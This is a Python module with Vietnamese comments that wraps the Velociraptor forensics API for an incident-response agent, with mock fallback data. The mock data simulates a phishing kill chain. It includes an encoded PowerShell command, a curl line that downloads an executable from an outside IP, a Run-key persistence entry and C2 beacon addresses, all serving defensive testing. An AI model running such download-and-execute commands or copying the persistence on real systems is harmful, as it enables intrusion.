"""Velociraptor client — gRPC API wrapper với mock fallback.

Mock mode (default): trả dữ liệu giả lập có shape giống output thật, dùng để
test agent loop khi chưa có Velociraptor server.

Real mode: set env `VR_USE_REAL=1` + cung cấp `VR_API_CONFIG` (file YAML do
Velociraptor sinh: `velociraptor config api_client --name agent`).

Tham khảo: https://docs.velociraptor.app/docs/server_automation/server_api/
"""

import os
import json
import logging
from typing import Optional

logger = logging.getLogger("agent.vr_client")

VR_USE_REAL = os.environ.get("VR_USE_REAL", "0") == "1"
VR_API_CONFIG = os.environ.get("VR_API_CONFIG", "/etc/velociraptor/api.config.yaml")
VR_QUERY_TIMEOUT = int(os.environ.get("VR_QUERY_TIMEOUT", "60"))
VR_CLIENT_MAP_FILE = os.environ.get(
    "VR_CLIENT_MAP_FILE",
    os.path.join(os.path.dirname(__file__), "vr_client_map.yaml"),
)

_CLIENT_MAP_CACHE: Optional[dict] = None


def _load_client_map() -> dict:
    """Đọc file YAML map hostname → Velociraptor client_id. Cache trong RAM."""
    global _CLIENT_MAP_CACHE
    if _CLIENT_MAP_CACHE is not None:
        return _CLIENT_MAP_CACHE
    if not os.path.exists(VR_CLIENT_MAP_FILE):
        _CLIENT_MAP_CACHE = {}
        return _CLIENT_MAP_CACHE
    try:
        import yaml
        with open(VR_CLIENT_MAP_FILE) as f:
            _CLIENT_MAP_CACHE = yaml.safe_load(f) or {}
    except Exception as e:
        logger.warning("Không đọc được client map %s: %s", VR_CLIENT_MAP_FILE, e)
        _CLIENT_MAP_CACHE = {}
    return _CLIENT_MAP_CACHE


def _resolve_client_id(name: str) -> str:
    """Convert hostname (vd 'WIN-01') sang Velociraptor client_id ('C.1a2b...').

    Quy tắc:
    - Nếu name đã có dạng 'C.xxx' → dùng nguyên
    - Nếu có trong client map file → trả về client_id
    - Nếu không khớp → trả về name nguyên (real mode sẽ fail có ý nghĩa)
    """
    if name.startswith("C.") and len(name) >= 10:
        return name
    mapping = _load_client_map()
    resolved = mapping.get(name)
    if not resolved:
        name_lower = name.lower()
        resolved = next(
            (client_id for host, client_id in mapping.items()
             if str(host).lower() == name_lower),
            None,
        )
    if resolved:
        return resolved
    logger.warning(
        "Không tìm thấy client_id cho host '%s' trong %s — thêm vào để Velociraptor query được",
        name, VR_CLIENT_MAP_FILE,
    )
    return name


# ── Mock data ────────────────────────────────────────────────────
# Shape khớp với output VQL thật của Velociraptor — agent học pattern từ đây
# rồi áp dụng được sang real data mà không cần đổi prompt.

_MOCK_PROCESS_TREE = {
    "target_process": {
        "pid": 4521,
        "name": "powershell.exe",
        "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...",
        "user": "DESKTOP-XYZ\\alice",
        "signed": True,
        "publisher": "Microsoft Windows",
        "started": "2026-05-17T10:23:45Z",
        "integrity_level": "Medium",
    },
    "parent_chain": [
        {"pid": 3120, "name": "outlook.exe",
         "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
         "signed": True, "publisher": "Microsoft Corporation",
         "note": "Outlook spawn PowerShell là pattern phishing kinh điển"},
        {"pid": 2100, "name": "explorer.exe", "signed": True,
         "publisher": "Microsoft Windows"},
    ],
    "children": [
        {"pid": 4789, "name": "curl.exe",
         "command_line": "curl http://185.220.101.47/x.bin -o C:\\Users\\Public\\xkj9.exe",
         "started": "2026-05-17T10:23:48Z", "signed": True},
        {"pid": 4801, "name": "xkj9.exe",
         "path": "C:\\Users\\Public\\xkj9.exe",
         "command_line": "C:\\Users\\Public\\xkj9.exe",
         "started": "2026-05-17T10:23:55Z",
         "signed": False,
         "note": "File mới tạo, KHÔNG có chữ ký số → highly suspicious"},
    ],
    "_mock": True,
    "_evidence_grade": "high",
    "interpretation_vi": (
        "Cây tiến trình: outlook.exe (parent) → powershell.exe (encoded) → "
        "curl.exe tải file → xkj9.exe (unsigned) chạy. Đây là kill-chain phishing "
        "→ execution → download → persistence điển hình."
    ),
}

_MOCK_FILE_ARTIFACTS = {
    "files_created_by_process": [
        {
            "path": "C:\\Users\\Public\\xkj9.exe",
            "size_bytes": 234567,
            "sha256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
            "created": "2026-05-17T10:23:50Z",
            "signed": False,
            "interpretation_vi": "Binary unsigned dropper, đặt ở %PUBLIC% (writable cho mọi user)",
        },
        {
            "path": "C:\\Users\\alice\\AppData\\Local\\Temp\\encoded.ps1",
            "size_bytes": 8192,
            "sha256": "ff11ee22dd33cc44bb55aa6699887766554433221100ffeeddccbbaa99887766",
            "created": "2026-05-17T10:23:46Z",
            "signed": False,
            "interpretation_vi": "PowerShell script tạm, có thể là payload decode từ -EncodedCommand",
        },
    ],
    "registry_persistence": [
        {
            "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\xkj9",
            "value": "C:\\Users\\Public\\xkj9.exe",
            "type": "REG_SZ",
            "created": "2026-05-17T10:23:56Z",
            "interpretation_vi": (
                "Persistence registry — binary tự chạy mỗi khi user login. "
                "T1547.001 Registry Run Keys."
            ),
        },
    ],
    "_mock": True,
    "_evidence_grade": "high",
}

_MOCK_NETWORK = {
    "connections": [
        {
            "process": "curl.exe",
            "pid": 4789,
            "dst_ip": "185.220.101.47",
            "dst_port": 80,
            "protocol": "HTTP",
            "bytes_sent": 1234,
            "bytes_received": 234567,
            "started": "2026-05-17T10:23:49Z",
            "ip_reputation": "tor_exit_node",
            "interpretation_vi": "Tor exit node — attacker dùng anti-attribution để dropper",
        },
        {
            "process": "xkj9.exe",
            "pid": 4801,
            "dst_ip": "104.244.42.193",
            "dst_port": 443,
            "protocol": "HTTPS",
            "bytes_sent": 2456,
            "bytes_received": 8901,
            "started": "2026-05-17T10:24:01Z",
            "ip_reputation": "unknown",
            "interpretation_vi": "Beacon HTTPS sau khi dropper chạy → khả năng C2 channel",
        },
    ],
    "_mock": True,
    "_evidence_grade": "high",
}


# ── VQL queries cho real mode ────────────────────────────────────
# Khi VR_USE_REAL=1, gọi _run_vql() để execute. Các artifact dưới đây là
# built-in của Velociraptor — không cần custom.

# Pattern: collect_client → wait → source. Mỗi query ~20-30s.
# `watch_monitoring` block đảm bảo flow hoàn tất trước khi source().

_VQL_PROCESS_TREE = """
LET flow <= collect_client(client_id=ClientId,
                            artifacts=['Windows.System.Pslist'],
                            timeout=60)
LET _wait <= SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
             WHERE FlowId = flow.flow_id LIMIT 1
SELECT Pid, Name, Exe, CommandLine, Username, Ppid,
       Authenticode.Trusted AS Trusted,
       Authenticode.IssuerName AS Publisher,
       CreateTime
FROM source(client_id=ClientId, flow_id=flow.flow_id,
            artifact='Windows.System.Pslist')
"""

_VQL_STARTUP_ITEMS = """
LET flow <= collect_client(client_id=ClientId,
                            artifacts=['Windows.Sys.StartupItems'],
                            timeout=60)
LET _wait <= SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
             WHERE FlowId = flow.flow_id LIMIT 1
SELECT *
FROM source(client_id=ClientId, flow_id=flow.flow_id,
            artifact='Windows.Sys.StartupItems')
LIMIT 200
"""

_VQL_NEW_FILES = """
LET flow <= collect_client(client_id=ClientId,
                            artifacts=['Windows.Search.FileFinder'],
                            spec=dict(`Windows.Search.FileFinder`=dict(
                                SearchFilesGlobTable='Glob\nC:\\\\Users\\\\Public\\\\*.exe\nC:\\\\Users\\\\Public\\\\*.dll\nC:\\\\ProgramData\\\\**\\\\*.exe\nC:\\\\Windows\\\\Temp\\\\*.exe',
                                Calculate_Hash='Y'
                            )),
                            timeout=90)
LET _wait <= SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
             WHERE FlowId = flow.flow_id LIMIT 1
SELECT OSPath AS FullPath, Size,
       MTime AS Modified,
       BTime AS Created,
       Hash.SHA256 AS SHA256
FROM source(client_id=ClientId, flow_id=flow.flow_id,
            artifact='Windows.Search.FileFinder')
LIMIT 100
"""

_VQL_NETSTAT = """
LET flow <= collect_client(client_id=ClientId,
                            artifacts=['Windows.Network.NetstatEnriched'],
                            timeout=60)
LET _wait <= SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
             WHERE FlowId = flow.flow_id LIMIT 1
SELECT Pid, Name AS ProcessName, Status,
       Laddr.IP AS LocalIP, Laddr.Port AS LocalPort,
       Raddr.IP AS RemoteIP, Raddr.Port AS RemotePort
FROM source(client_id=ClientId, flow_id=flow.flow_id,
            artifact='Windows.Network.NetstatEnriched')
WHERE Status = 'ESTABLISHED'
  AND NOT (RemoteIP =~ '^(10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|127\\.|169\\.254\\.)')
LIMIT 100
"""


def _run_vql(vql: str, client_id: str, env: Optional[dict] = None) -> list[dict]:
    """Execute VQL trên 1 client qua gRPC API.

    Yêu cầu: `pip install pyvelociraptor grpcio` và file `VR_API_CONFIG` hợp lệ.
    """
    try:
        from pyvelociraptor import api_pb2, api_pb2_grpc
        import grpc
        import yaml
    except ImportError as e:
        raise RuntimeError(
            "pyvelociraptor chưa cài. Chạy: pip install pyvelociraptor grpcio pyyaml"
        ) from e

    with open(VR_API_CONFIG) as f:
        config = yaml.safe_load(f)

    creds = grpc.ssl_channel_credentials(
        root_certificates=config["ca_certificate"].encode(),
        private_key=config["client_private_key"].encode(),
        certificate_chain=config["client_cert"].encode(),
    )
    # TLS server cert là "VelociraptorServer" — KHÔNG dùng config["name"] (đó là API user)
    options = (("grpc.ssl_target_name_override", "VelociraptorServer"),)

    # ClientId luôn được inject vào env để VQL không phải hardcode
    full_env = {"ClientId": client_id, **(env or {})}

    with grpc.secure_channel(config["api_connection_string"], creds, options) as channel:
        stub = api_pb2_grpc.APIStub(channel)
        req = api_pb2.VQLCollectorArgs(
            max_wait=120, max_row=1000,
            Query=[api_pb2.VQLRequest(VQL=vql, Name="agent_query")],
            env=[api_pb2.VQLEnv(key=k, value=str(v)) for k, v in full_env.items()],
        )
        rows: list[dict] = []
        try:
            for resp in stub.Query(req, timeout=VR_QUERY_TIMEOUT):
                if resp.Response:
                    data = json.loads(resp.Response)
                    if isinstance(data, list):
                        rows.extend(data)
                    else:
                        rows.append(data)
        except grpc.RpcError as e:
            logger.error("Velociraptor RPC error: %s", e)
            raise
        return rows


# ── Public API — gọi từ tools.py ─────────────────────────────────

def get_process_tree_deep(client_id: str, pid: int) -> dict:
    """Lấy cây tiến trình sâu (parent chain + children + ký số) từ host thật."""
    if not VR_USE_REAL:
        return _MOCK_PROCESS_TREE

    client_id = _resolve_client_id(client_id)
    try:
        rows = _run_vql(_VQL_PROCESS_TREE, client_id)
        # Tổ chức cây từ tất cả process: target → parent chain (up) + children (down)
        by_pid = {int(r["Pid"]): r for r in rows if r.get("Pid") is not None}
        target = by_pid.get(int(pid), {})
        children = [r for r in rows if r.get("Ppid") == pid]
        # Parent chain leo lên tới khi Ppid=0 hoặc không còn
        parents: list[dict] = []
        cur = target
        for _ in range(8):  # max 8 levels
            ppid = cur.get("Ppid") if cur else None
            if not ppid:
                break
            cur = by_pid.get(int(ppid))
            if not cur:
                break
            parents.append(cur)
        return {
            "target_process": target,
            "parent_chain": parents,
            "children": children,
            "total_procs_scanned": len(rows),
            "_evidence_grade": "high" if target else ("low" if rows else "missing"),
        }
    except Exception as e:
        logger.warning("Velociraptor query failed (process tree): %s", e)
        return {
            "target_process": {},
            "parent_chain": [],
            "children": [],
            "total_procs_scanned": 0,
            "_evidence_grade": "missing",
            "_real_query_failed": str(e),
        }


def get_file_artifacts(client_id: str, since_minutes: int = 30) -> dict:
    """Lấy file mới tạo + registry persistence từ host thật.

    Gọi 2 VQL artifact:
    - Windows.Search.FileFinder: file .exe/.dll trong C:\\Users\\Public, ProgramData, Temp
    - Windows.Sys.StartupItems: Run keys + Startup folder items
    """
    if not VR_USE_REAL:
        return _MOCK_FILE_ARTIFACTS

    client_id = _resolve_client_id(client_id)
    files: list[dict] = []
    persistence: list[dict] = []
    errors: list[str] = []

    try:
        files = _run_vql(_VQL_NEW_FILES, client_id)
    except Exception as e:
        logger.warning("Velociraptor file query failed: %s", e)
        errors.append(f"file_query: {e}")

    try:
        persistence_raw = _run_vql(_VQL_STARTUP_ITEMS, client_id)
        # Lọc Run keys có dấu hiệu suspicious (path Users\Public, Temp, ProgramData)
        # Velociraptor StartupItems field: Details = path/command, OSPath = registry key location
        SUSPICIOUS_PATH_SUBSTRINGS = (
            "users\\public", "appdata\\local\\temp", "appdata\\roaming",
            "programdata", "windows\\temp", "\\downloads\\",
        )
        persistence = [
            p for p in persistence_raw
            if p.get("Details") and
               any(s in str(p.get("Details", "")).lower()
                   for s in SUSPICIOUS_PATH_SUBSTRINGS)
        ]
    except Exception as e:
        logger.warning("Velociraptor startup query failed: %s", e)
        errors.append(f"startup_query: {e}")

    grade = "high" if (files or persistence) else "low"
    if errors and not files and not persistence:
        grade = "missing"

    return {
        "files_created_by_process": files,
        "registry_persistence": persistence,
        "_evidence_grade": grade,
        **({"_query_errors": errors} if errors else {}),
    }


def get_network_connections_deep(client_id: str, since_minutes: int = 30) -> dict:
    """Lấy kết nối mạng đang active trên host thật (chỉ external IP)."""
    if not VR_USE_REAL:
        return _MOCK_NETWORK

    client_id = _resolve_client_id(client_id)
    try:
        rows = _run_vql(_VQL_NETSTAT, client_id, env={"SinceMinutes": since_minutes})
        return {"connections": rows, "_evidence_grade": "high" if rows else "low"}
    except Exception as e:
        logger.warning("Velociraptor query failed (netstat): %s", e)
        return {
            "connections": [],
            "_evidence_grade": "missing",
            "_real_query_failed": str(e),
        }
